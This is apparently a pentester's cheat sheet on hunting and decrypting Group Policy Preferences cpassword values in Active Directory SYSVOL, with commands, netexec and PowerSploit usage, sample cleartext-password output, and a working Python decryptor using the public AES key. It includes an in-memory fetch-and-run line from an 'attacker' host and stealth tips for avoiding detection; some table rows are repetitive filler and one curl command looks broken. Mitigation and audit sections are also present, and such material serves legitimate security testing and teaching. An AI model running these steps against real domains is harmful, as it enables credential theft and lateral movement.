---
aliases:
  - GPP cpassword
  - Group Policy Preferences
  - MS14-025
  - gpp-decrypt
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - GPO y SYSVOL Enumeration]]"
  - "[[SYSVOL y GPP cpassword]]"
---
# AD - GPO & SYSVOL Enumeration - GPP cpassword

***

## Find cpassword in SYSVOL

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `findstr /S /I /M cpassword \\dom\SYSVOL\dom\Policies\*.xml` | Native Windows hunt | Standard. |
| `findstr /S /I cpassword \\dom\SYSVOL\dom\Policies\*.xml` | Show matches | Standard. |
| `grep -r "cpassword" /mnt/sysvol` | Linux mount hunt | Standard. |
| `find /mnt/sysvol -name "*.xml" -exec grep -l cpassword {} \;` | Find files | Standard. |
| `Select-String -Path \\dom\SYSVOL -Recurse -Pattern "cpassword"` | PS native | Standard. |
| `Get-ChildItem \\dom\SYSVOL -Recurse -Filter "*.xml" | Select-String "cpassword"` | Bulk PS | Standard. |
| `nxc smb DC -u u -p p -M gpp_password` | netexec module | Auto-decrypt. |
| `nxc smb DC -u u -p p -M gpp_autologin` | Adjacent module | Edge. |
| `Get-GPPPassword` (PowerSploit) | PS function | Auto-decrypt. |
| `crackmapexec smb DC --gpp-passwords` | Older name | Same. |
| Common files: Groups.xml, ScheduledTasks.xml | Standard | Standard. |
| Other targets: Services.xml, DataSources.xml, Drives.xml, Printers.xml | Comprehensive | Standard. |
| Per-GPO XML may have cpassword | Standard | Standard. |
| Detection: bulk cpassword reads | Defender | Adjacent. |
| Modern: cpassword removed by MS14-025 | Patched May 2014 | Standard. |
| Legacy environments still vuln | Audit | Standard. |
^ad-cpassword-find

### cpassword hunt

```bash
# Linux mount + grep
sudo mount -t cifs //DC/SYSVOL /mnt/sysvol -o user=user,pass=pass,domain=dom
grep -r "cpassword" /mnt/sysvol --include="*.xml" 2>/dev/null

# netexec module (auto-decrypts)
nxc smb DC -u user -p pass -M gpp_password

# Output:
# [+] Found credentials in \\dom\SYSVOL\dom\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
#     Username: admin
#     Password: P@ssw0rd!
```

```cmd
:: Native Windows
findstr /S /I /M cpassword \\dom\SYSVOL\dom\Policies\*.xml

:: Or PS
Get-ChildItem \\dom\SYSVOL -Recurse -Filter "*.xml" |
  Select-String -Pattern "cpassword"
```

___

## Decrypt cpassword (gpp-decrypt)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `gpp-decrypt <encrypted_string>` | Linux Ruby tool | Standard. |
| `gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"` | Example | Standard. |
| Output: cleartext password | Direct | Standard. |
| AES-256 with hardcoded key | Public Microsoft key | Standard. |
| Key documented in MS-GPPREF spec | Public | Standard. |
| Native Python: `pycryptodome` decrypt | DIY | Edge. |
| `Get-GPPPassword` auto-decrypt | PS function | Standard. |
| `nxc smb -M gpp_password` auto-decrypt | netexec | Standard. |
| Modern: PostMS14-025 cpassword removed | Patched | Standard. |
| Legacy: still works on old SYSVOL files | Audit candidate | Standard. |
| Per-attribute decrypt | XML structure | Standard. |
| Cleanup post-engagement | Standard | OPSEC. |
| Detection: bulk decrypt activities | Defender | Adjacent. |
| Modern: minimal cpassword exposure | Best practice | Standard. |
| Audit: per-GPO XML review | Standard | Compliance. |
| Adjacent: SYSVOL Content hub | Cross-ref | Adjacent. |
^ad-cpassword-decrypt

### Decrypt with gpp-decrypt

```bash
# Kali / pentesting distros
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

# Output: cleartext password

# Python alternative
python3 -c "
from Cryptodome.Cipher import AES
import base64

key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
encrypted = 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'
encrypted += '=' * (-len(encrypted) % 4)
cipher = AES.new(key, AES.MODE_CBC, b'\\x00' * 16)
decrypted = cipher.decrypt(base64.b64decode(encrypted)).rstrip(b'\\x10')
print(decrypted.decode('utf-16-le'))
"
```

___

## GPP File Patterns

| **File** | **Path** | **cpassword Location** |
|:---:|:---:|:---:|
| Groups.xml | `Preferences\Groups\Groups.xml` | `<User properties cpassword="...">` |
| ScheduledTasks.xml | `Preferences\ScheduledTasks\ScheduledTasks.xml` | `<Task properties cpassword="...">` |
| Services.xml | `Preferences\Services\Services.xml` | `<NTService properties cpassword="...">` |
| DataSources.xml | `Preferences\DataSources\DataSources.xml` | `<DataSource properties cpassword="...">` |
| Printers.xml | `Preferences\Printers\Printers.xml` | `<SharedPrinter properties cpassword="...">` |
| Drives.xml | `Preferences\Drives\Drives.xml` | `<Drive properties cpassword="...">` |
| Per-GPO Machine + User sides | Standard | Standard. |
| `User\Preferences\` | User-side | Standard. |
| `Machine\Preferences\` | Computer-side | Standard. |
| Common: Groups.xml + ScheduledTasks.xml | Standard | Standard. |
| Less common: DataSources, Printers | Edge | Edge. |
| `userName=` attribute | Account name | Adjacent. |
| `runAs=` attribute | Run-as user | Adjacent. |
| `accountName=` attribute | Standard | Adjacent. |
| Multiple cpasswords per file | Edge | Edge. |
| Detection: per-file cpassword | Defender | Adjacent. |
^ad-cpassword-patterns

### XML structure example

```xml
<!-- Groups.xml example -->
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="...">
  <User clsid="..." name="Administrator" image="2" 
        changed="2014-01-01 00:00:00" uid="...">
    <Properties action="U" newName="" fullName="" description=""
                cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"  <!-- DECRYPT THIS -->
                changeLogon="0" noChange="1" neverExpires="1"
                acctDisabled="0" userName="Administrator"/>
  </User>
</Groups>

<!-- ScheduledTasks.xml example -->
<Task clsid="...">
  <Properties action="C" name="BackupTask" runAs="dom\backupsvc"
              cpassword="encrypted_string_here"/>
</Task>
```

___

## netexec gpp Modules

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `nxc smb DC -u u -p p -M gpp_password` | Auto-discover + decrypt | Standard. |
| `nxc smb DC -u u -p p -M gpp_autologin` | AutoLogin creds | Adjacent. |
| Bulk subnet | Per-DC | Adjacent. |
| Anonymous attempt | Edge | Standard. |
| Output: file path + creds | Standard | Standard. |
| Output to file | Standard | Reportable. |
| Authenticated baseline | Standard | Reliable. |
| Adjacent: --gpp-passwords (older flag) | Compat | Edge. |
| Modern netexec preferred | Standard | Standard. |
| Cross-correlate with SYSVOL spider | Standard | Audit. |
| Detection: SYSVOL bulk reads | Defender | Adjacent. |
| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
| Modern: extreme audit | Best practice | Standard. |
| Adjacent: SYSVOL Content hub | Cross-ref | Adjacent. |
| Compliance: documented per-engagement | Standard | OPSEC. |
| Cleanup post-engagement | Standard | OPSEC. |
^ad-cpassword-netexec

### netexec gpp modules

```bash
DC="dc01.dom.local"

# Auto-discover GPP cpassword + decrypt
nxc smb $DC -u user -p pass -M gpp_password

# AutoLogin creds (HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon)
nxc smb $DC -u user -p pass -M gpp_autologin

# Output:
# SMB     DC    445   DC01    [+] Found cpassword in \\dom\SYSVOL\dom\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
#                              Username: admin
#                              Password: Pa$$w0rd123
```

___

## PowerSploit Get-GPPPassword

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `Import-Module PowerSploit` | Load module | Adjacent. |
| `Get-GPPPassword` | Native PS function | Standard. |
| `Get-GPPPassword -DomainController DC` | Specific DC | Adjacent. |
| Output: cleartext per file | Standard | Standard. |
| Modern PS preferred | Standard | Standard. |
| Adversary-classic | Red team | Standard. |
| OPSEC: in-memory load | Defender evasion | Adjacent. |
| `IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerSploit.ps1')` | Adjacent | Edge. |
| Detection: PowerSploit signatures | Defender | Adjacent. |
| Cross-correlate with SYSVOL spider | Standard | Audit. |
| Adjacent: SYSVOL Content hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Modern: PowerSploit may flagged | EDR | Adjacent. |
| Audit baseline | Standard | Compliance. |
| Cleanup post-engagement | Standard | OPSEC. |
| BloodHound integration adjacent | Modern | Tool. |
^ad-cpassword-powersploit

### PowerSploit usage

```powershell
# Load
Import-Module .\PowerSploit\PowerSploit.psd1

# Get all GPP passwords
Get-GPPPassword

# Output:
# Passwords      : {Pa$$w0rd123}
# UserNames      : {admin}
# File           : \\dom\SYSVOL\dom\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
# Changed        : 2014-01-01 00:00:00
# NewName        :
```

___

## Custom Python Decryptor

```python
#!/usr/bin/env python3
"""
GPP cpassword decryptor (Microsoft public AES key)
"""
from Cryptodome.Cipher import AES
import base64
import sys

# Microsoft public AES key from MS-GPPREF spec
KEY = bytes.fromhex(
  '4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'
)

def decrypt_cpassword(cpassword):
    # Pad base64 if needed
    cpassword += '=' * (-len(cpassword) % 4)
    
    # Decode base64
    encrypted = base64.b64decode(cpassword)
    
    # Decrypt AES-256-CBC with zero IV
    cipher = AES.new(KEY, AES.MODE_CBC, b'\x00' * 16)
    decrypted = cipher.decrypt(encrypted)
    
    # Strip PKCS#7 padding
    pad = decrypted[-1]
    decrypted = decrypted[:-pad]
    
    # Decode UTF-16-LE
    return decrypted.decode('utf-16-le')

if __name__ == '__main__':
    if len(sys.argv) > 1:
        print(decrypt_cpassword(sys.argv[1]))
    else:
        print(f"Usage: {sys.argv[0]} <cpassword>")
```

___

## Modern Mitigations & Audit

| **Mitigation** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Patch MS14-025 (May 2014) | Removes cpassword from new GPP | Standard. |
| Audit existing GPP files | Pre-patch leftover | Critical audit. |
| Remove cpassword XML attributes | Manual cleanup | Standard. |
| Modern: avoid GPP for credentials | Best practice | Standard. |
| Use gMSA for service accounts | Modern | Hardening. |
| Use LAPS for local admin | Modern | Hardening. |
| Per-quarter SYSVOL audit | Standard | Compliance. |
| Detection: bulk SYSVOL reads | Defender | Adjacent. |
| Microsoft Defender for Identity GPP alerts | Modern | Defender. |
| BloodHound SYSVOL adjacent | Modern | Tool. |
| Compliance: documented baseline | Standard | Adjacent. |
| Audit log retention | Standard | Adjacent. |
| Modern: continuous monitoring | Defender | Standard. |
| Cleanup post-engagement | Standard | OPSEC. |
| Cross-correlate with priv | Standard | Audit. |
| Adjacent: SYSVOL & GPP cpassword hub | Cross-ref | Adjacent. |
^ad-cpassword-mitigations

### Mitigation script

```powershell
# Find + remove cpassword from existing GPP XMLs (privileged)
Get-ChildItem \\dom\SYSVOL -Recurse -Filter "*.xml" |
  ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -match 'cpassword="[^"]+"') {
      Write-Warning "GPP cpassword found: $($_.FullName)"
      # Manual cleanup recommended
      # $content = $content -replace 'cpassword="[^"]+"', ''
      # Set-Content $_.FullName -Value $content
    }
  }
```

```bash
# Bulk find for audit
find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \; 2>/dev/null
```

___

## OPSEC

| **Aspect** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| SYSVOL bulk read = SIEM flag | Defender | Adjacent. |
| Targeted file read | Stealthier | OPSEC. |
| Per-extension grep | Targeted | OPSEC. |
| Detection: bulk SMB reads | Defender ML | Modern. |
| OPSEC: per-engagement scope | Per-target | Standard. |
| Audit log retention | Standard | Adjacent. |
| Adjacent: SYSVOL Content hub | Cross-ref | Adjacent. |
| Modern: continuous monitoring | Defender | Standard. |
| Cleanup not needed (read-only) | Standard | OPSEC. |
| Compliance: red team scoped | Standard | OPSEC. |
| Time-of-day pacing | Match legit | Stealth. |
| Honeypot accounts as bait | Defender plant | Detection. |
| Modern: extreme alerting | Best practice | Standard. |
| Cross-correlate with engagement | Per-engagement | Standard. |
| Modern: BHCE preferred | Standard | Tool. |
| Adjacent: GPO Abuse hub | Cross-ref | Adjacent. |
^ad-cpassword-opsec

### OPSEC-aware hunt

```bash
# Targeted (stealthier)
curl -sI //DC/SYSVOL/dom.local/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml

# vs Bulk (loud)
nxc smb DC -u user -p pass -M gpp_password  # comprehensive but loud

# Per-engagement: scope to specific OUs / GPOs
```

***
